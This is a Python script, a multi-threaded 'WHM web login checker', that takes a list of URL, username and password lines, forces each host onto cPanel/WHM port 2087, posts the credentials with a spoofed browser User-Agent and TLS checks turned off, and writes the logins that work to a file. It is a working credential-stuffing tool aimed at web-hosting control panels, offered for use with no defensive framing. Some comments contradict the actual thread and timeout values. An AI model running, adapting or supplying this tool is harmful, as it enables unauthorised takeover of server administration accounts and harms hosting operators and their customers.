#!/usr/bin/env python3

import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from colorama import Fore, init

init(autoreset=True)

INPUT_FILE = "whm.txt"
OUTPUT_VALID = "whm_valid.txt"

# --- SPEED OPTIMIZATIONS ---
THREADS = 200       # Increased from 10 to 50 for rapid parallel processing
TIMEOUT = 30       # Dropped from 15s to 5s so slow/dead servers don't hang your script
# ---------------------------

lock = threading.Lock()
session_pool = threading.local()

stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "failed": 0,
}


def banner():
    print(Fore.CYAN + r"""
 ██╗    ██╗██╗  ██╗███╗   ███╗
 ██║    ██║██║  ██║████╗ ████║
 ██║ █╗ ██║███████║██╔████╔██║
 ██║███╗██║██╔══██║██║╚██╔╝██║
 ╚███╔███╔╝██║  ██║██║ ╚═╝ ██║
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝

          WHM WEB LOGIN CHECKER [TURBO]
    """)

    print(Fore.YELLOW + f"Input   : {INPUT_FILE}")
    print(Fore.GREEN + f"Valid   : {OUTPUT_VALID}")
    print(Fore.MAGENTA + f"Threads : {THREADS} [HIGH SPEED]")
    print(Fore.MAGENTA + f"Timeout : {TIMEOUT}s")
    print()


def parse_line(line):
    parts = line.strip().split("|", 2)
    if len(parts) != 3:
        return None

    url = parts[0].strip().rstrip("/")
    username = parts[1].strip()
    password = parts[2].strip()

    if not url or not username or not password:
        return None

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    try:
        parsed = urlparse(url)
        if not parsed.hostname:
            return None
        if parsed.port is None or parsed.port != 2087:
            url = f"https://{parsed.hostname}:2087"
    except ValueError:
        return None

    return url, username, password


def get_thread_session():
    """ Reuse TCP connections per-thread using HTTP Keep-Alive for massive speed gains """
    if not hasattr(session_pool, "session"):
        session_pool.session = requests.Session()
        # Configure the adapter to handle high-volume pooling
        adapter = requests.adapters.HTTPAdapter(pool_connections=THREADS, pool_maxsize=THREADS)
        session_pool.session.mount("https://", adapter)
        session_pool.session.mount("http://", adapter)
    return session_pool.session


def authenticate_cpanel(line):
    parsed = parse_line(line)
    if parsed is None:
        return "invalid", line, "BAD FORMAT"

    url, username, password = parsed

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    payload = {
        "user": username,
        "pass": password
    }

    login_endpoint = f"{url}/login/"
    session = get_thread_session()

    try:
        response = session.post(
            login_endpoint,
            data=payload,
            headers=headers,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=True,
        )

        if "whm_zone_manager" in response.text:
            return "valid", line, "AUTH OK"
        
        if response.status_code in (401, 403) or "login_failed" in response.url:
            return "invalid", line, "REJECTED"

        return "invalid", line, "whm_zone_manager NOT FOUND"

    except requests.exceptions.Timeout:
        return "failed", line, "TIMEOUT"
    except Exception as e:
        return "failed", line, "CONN ERROR"


def save_result(filename, line):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(line + "\n")
        f.flush()


def process(line):
    result, original, reason = authenticate_cpanel(line)

    with lock:
        stats["checked"] += 1
        if result == "valid":
            stats["valid"] += 1
        elif result == "invalid":
            stats["invalid"] += 1
        else:
            stats["failed"] += 1

        checked = stats["checked"]
        valid = stats["valid"]
        invalid = stats["invalid"]
        failed = stats["failed"]

        if result == "valid":
            save_result(OUTPUT_VALID, original)

        # Quick clear and clean print
        print("\r" + " " * 80 + "\r", end="", flush=True)

        if result == "valid":
            print(Fore.GREEN + f"[+] VALID  --> {original} [{reason}]")
        elif result == "invalid":
            print(Fore.RED + f"[-] WRONG  --> {original} [{reason}]")
        else:
            print(Fore.YELLOW + f"[!] FAILED --> {original} [{reason}]")

        print(
            Fore.CYAN + f"Checked: {checked} | "
            + Fore.GREEN + f"Valid: {valid} "
            + Fore.RED + f"| Invalid: {invalid} "
            + Fore.YELLOW + f"| Failed: {failed}",
            end="",
            flush=True,
        )


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    banner()

    try:
        with open(INPUT_FILE, "r", encoding="utf-8", errors="ignore") as f:
            lines = [
                line.strip()
                for line in f
                if line.strip() and not line.lstrip().startswith("#")
            ]
    except FileNotFoundError:
        print(Fore.RED + f"[!] File not found: {INPUT_FILE}")
        return

    open(OUTPUT_VALID, "w", encoding="utf-8").close()
    print(Fore.CYAN + f"[•] Loaded {len(lines)} entries\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(process, line) for line in lines]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    print("\n")
    print(Fore.CYAN + "=" * 65)
    print(Fore.GREEN + f"VALID AUTH    : {stats['valid']}")
    print(Fore.CYAN + f"TOTAL CHECKED : {stats['checked']}")
    print(Fore.CYAN + "=" * 65)


if __name__ == "__main__":
    main()
